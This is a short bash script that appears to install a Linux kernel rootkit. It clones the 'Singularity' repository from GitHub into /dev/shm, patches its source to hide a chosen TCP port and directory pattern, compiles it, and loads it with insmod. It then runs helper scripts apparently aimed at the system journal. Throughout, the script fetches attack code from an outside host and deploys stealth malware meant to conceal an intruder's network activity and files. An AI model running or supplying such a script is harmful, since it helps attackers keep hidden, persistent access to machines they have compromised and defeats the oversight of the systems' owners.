#!/bin/bash

# This script needs root to run

if [[ $# -ne 4 ]]; then
    echo "Please specify the port to hide and the pattern of the directory to hide"
    echo "Usage: $0 -p <port> -pat <pattern>"
    exit 1
fi


# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -p)
            NEWPORT="$2"
            shift 2
            ;;
        -pat)
            PATTERN="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            echo "Please specify the port to hide and the pattern of the directory to hide"
            echo "Usage: $0 -p <port> -pat <pattern>"
            exit 1
            ;;
    esac
done

cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity

sed -i "s/^#define PORT .*/#define PORT $NEWPORT/" "modules/hiding_tcp.c"

ESCAPED=$(printf '%s\n' "$PATTERN" | sed 's/[&/\]/\\&/g')
sed -i "/hidden_patterns\[\].*{/a\    \"{$ESCAPED}\"," "include/hiding_directory_def.h"

make
sudo insmod singularity.ko
sudo bash scripts/journal.sh
sudo bash scripts/x.sh
